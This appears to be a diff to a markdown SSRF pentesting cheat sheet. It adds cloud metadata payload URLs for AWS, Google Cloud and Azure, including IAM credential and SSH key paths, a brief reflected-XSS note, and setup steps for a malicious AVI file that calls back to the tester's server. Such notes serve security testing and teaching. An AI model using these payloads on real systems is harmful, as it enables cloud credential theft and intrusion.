@@ -192,3 +192,70 @@ gopher://
     [Exploiting MySQL](https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html)<br></br>
 
 ## Cloud Metadata
+- There are various vendors that provide cloud computing services such as AWS, Azure, Google Cloud, Digital Ocean, etc. where these vendors provide Metadata access using REST API, but the REST API can only be accessed through the cloud network.
+
+- If a vulnerable SSRF web application is deployed in one of those Cloud Services, it will be very possible for an attacker to access Metadata information by exploiting the SSRF vulnerability.
+
+```php
+AWS:
+vulnerablesite.com/file/?url=http://instance-data
+vulnerablesite.com/file/?url=http://169.254.169.254
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/user-data
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/ami-id
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/reservation-id
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/hostname
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/public-keys/
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+vulnerablesite.com/file/?url=http://169.254.169.254/latest/dynamic/instance-identity/document
+
+Google Cloud:
+vulnerablesite.com/file/?url=http://169.254.169.254/computeMetadata/v1/
+vulnerablesite.com/file/?url=http://metadata.google.internal/computeMetadata/v1/
+vulnerablesite.com/file/?url=http://metadata/computeMetadata/v1/
+vulnerablesite.com/file/?url=http://metadata.google.internal/computeMetadata/v1/instance/hostname
+vulnerablesite.com/file/?url=http://metadata.google.internal/computeMetadata/v1/instance/id
+vulnerablesite.com/file/?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+Azure:
+vulnerablesite.com/file/?url=http://169.254.169.254/metadata/v1/maintenance
+vulnerablesite.com/file/?url=http://169.254.169.254/metadata/instance?api-version=2017-04-02
+vulnerablesite.com/file/?url=http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+```
+![](https://miro.medium.com/max/803/0*isNH_QDDzHtCYP3m.JPG)
+
+## Reflected XSS
+- Reflected XSS can occur if you are not faced with Blind SSRF.
+- XSS on Blind SSRF can happen if the requestster supports javascript, for examples like PhantomJS and Selenium, then it’s not impossible for an attacker to do a DNS Rebinding Attack to “play” with internal services/networks.
+
+![](https://miro.medium.com/max/875/0*zK5DVGUaafUFrnAq.JPG)
+
+- - - -
+
+## Extra details:
+Setup !
+
+1. A small server , just to check logs , you can use AWS or DigitalOcean.
+
+2. B-XSSRF to check the requests. Download it from [Here](https://github.com/SpiderMate/B-XSSRF) . ( Don’t forget to read the instructions given in repo )
+
+3. Malicious AVI file. Download it from [Here](https://github.com/pflashpunk/ssrf-video).
+
+4. Open the downloaded AVI file in notepad++ , search for http://127.0.0.1/request.php and replace it with yours.
+
+- - - -
+## References:
+https://mf-akbar.medium.com/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e <br></br>
+https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5 <br></br>
+https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf <br></br>
+https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 <br></br>
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-exploitation-via-url-scheme <br></br>
+https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery <br></br>
+https://www.fatalerrors.org/a/ssrf-using-dict-and-gopher-to-hang-redis.html <br></br>
+https://appcheck-ng.com/server-side-request-forgery-ssrf/# <br></br>
